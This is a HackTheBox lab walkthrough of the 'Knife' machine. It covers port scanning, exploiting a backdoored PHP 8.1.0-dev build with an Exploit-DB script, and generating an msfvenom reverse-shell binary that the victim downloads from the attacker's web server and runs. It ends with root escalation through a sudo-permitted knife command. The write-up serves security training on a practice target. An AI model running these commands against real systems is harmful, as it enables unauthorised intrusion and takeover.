---
layout: page
title: Knife
description: Knife from HackTheBox.
img: 
importance: 4
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/knife/logo.png" title="HTB Knife Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/Popcorn/Knife">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Let us take a stab out of this knife box.

Run nmap to discover the different port available.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/knife]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.242 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-21 00:51 AEDT
Nmap scan report for 10.10.10.242
Host is up (0.011s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT      ADDRESS
1   84.97 ms 10.10.16.1
2   9.31 ms  10.10.10.242

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.25 seconds
```
{% endraw %}

<br />
Run nmap for all the port just to see if there are any nonstandard ports.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/knife]
└─$ sudo nmap -sS -p- -oN nmapfull 10.10.10.242  
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-21 00:51 AEDT
Nmap scan report for 10.10.10.242
Host is up (0.016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 9.12 seconds
```
{% endraw %}

<br />
Check out the landing page on the web server.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/knife/landing.png" title="Check the Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Also, check the source for the landing page.

{% raw %}
```html
view-source:http://10.10.10.242/

<!DOCTYPE html>
<html lang="en" >

<head>

  <meta charset="UTF-8">
 

  <title> Emergent Medical Idea</title>
  
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">

  <snip>
```
{% endraw %}

<br />
And curl with the I option to pull the headers.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/knife]
└─$ curl -I http://10.10.10.242         
HTTP/1.1 200 OK
Date: Mon, 20 Jan 2025 13:56:07 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Content-Type: text/html; charset=UTF-8
```
{% endraw %}

<br />
Check Exploit-db for any potential exploits for that version of PHP listed in the X-Powered-By header.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/knife/exploit.png" title="Exploit-DB Exploit" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.exploit-db.com/exploits/49933">Exploit-DB</a>

<br />
Download the python script exploit to the local working folder.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/knife]
└─$ wget https://www.exploit-db.com/raw/49933 -O exploit.py                                
--2025-01-21 01:05:23--  https://www.exploit-db.com/raw/49933
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2040 (2.0K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                                                 100%[========================================================================================================================================>]   1.99K  --.-KB/s    in 0s      

2025-01-21 01:05:24 (59.1 MB/s) - ‘exploit.py’ saved [2040/2040]
```
{% endraw %}

<br />
Execute the script and run whoami just to test the command execution.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/knife]
└─$ python exploit.py
Enter the full host url:
http://10.10.10.242

Interactive shell is opened on http://10.10.10.242 
Can't acces tty; job crontol turned off.
$ whoami
james
```
{% endraw %}

<br />
Start a netcat listener.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/knife]
└─$ sudo nc -nlvp 443
[sudo] password for kali: 
listening on [any] 443 ...
```
{% endraw %}

<br />
Generate a msfvenom payload.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/knife]
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.16.3 LPORT=443 -f elf -o shell
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 68 bytes
Final size of elf file: 152 bytes
Saved as: shell
```
{% endraw %}

<br />
Start python webserver to serve the new exploit.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/knife]
└─$ python -m 'http.server'                                                                                     
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Transfer the new elf file to the victim.  Use chmod +x to change the permission of the file.  Run the executable.

{% raw %}
```bash
$ curl http://10.10.16.3:8000/shell -o /dev/shm/shell

$ chmod +x /dev/shm/shell

$ /dev/shm/shell
```
{% endraw %}

<br />
Check the listener and catch the shell.  Run the whoami to confirm command execution.  Use the python to ugrade the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/knife]
└─$ sudo nc -nlvp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.242] 48238
whoami
james
python3 -c 'import pty; pty.spawn("/bin/bash")'
james@knife:/$ 
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```bash
james@knife:/home/james$ cat user.txt
cat user.txt
<redacted>
james@knife:/home/james$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:45:02 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.242/24 brd 10.10.10.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:4502/64 scope global dynamic mngtmpaddr 
       valid_lft 86392sec preferred_lft 14392sec
    inet6 fe80::250:56ff:feb9:4502/64 scope link 
       valid_lft forever preferred_lft forever 
```
{% endraw %}

<br />
Run sudo -l to get a list of the command this user can run as sudo.

{% raw %}
```bash
james@knife:/home/james$ sudo -l
sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife 
```
{% endraw %}

<br />
Run ls -la on that file.

{% raw %}
```bash
james@knife:/home/james$ ls -la /usr/bin/knife
ls -la /usr/bin/knife
lrwxrwxrwx 1 root root 31 May  7  2021 /usr/bin/knife -> /opt/chef-workstation/bin/knife
```
{% endraw %}

<br />
Run the knife command to see what it does.

{% raw %}
```bash
james@knife:/home/james$ /usr/bin/knife
/usr/bin/knife
ERROR: You need to pass a sub-command (e.g., knife SUB-COMMAND)

Usage: knife sub-command (options)
    -s, --server-url URL             Chef Infra Server URL.
        --chef-zero-host HOST        Host to start Chef Infra Zero on.
        --chef-zero-port PORT        Port (or port range) to start Chef Infra Zero on. Port ranges like 1000,1010 or 8889-9999 will try all given ports until one works.
    -k, --key KEY                    Chef Infra Server API client key.

    <snip>
```
{% endraw %}

<br />
Check the knife on the GTFOBins.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/knife/gtfo.png" title="Check the GTFOBins" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://gtfobins.github.io/gtfobins/knife/">GTFOBins</a>

<br />
Execute the one-liner that was indicate in the bins.

{% raw %}
```bash
james@knife:/$ sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
# whoami
whoami
root
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```bash
# cat /root/root.txt
cat /root/root.txt
<redacted>
# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:45:02 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.242/24 brd 10.10.10.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:4502/64 scope global dynamic mngtmpaddr 
       valid_lft 86398sec preferred_lft 14398sec
    inet6 fe80::250:56ff:feb9:4502/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
And with that...ninja vanish!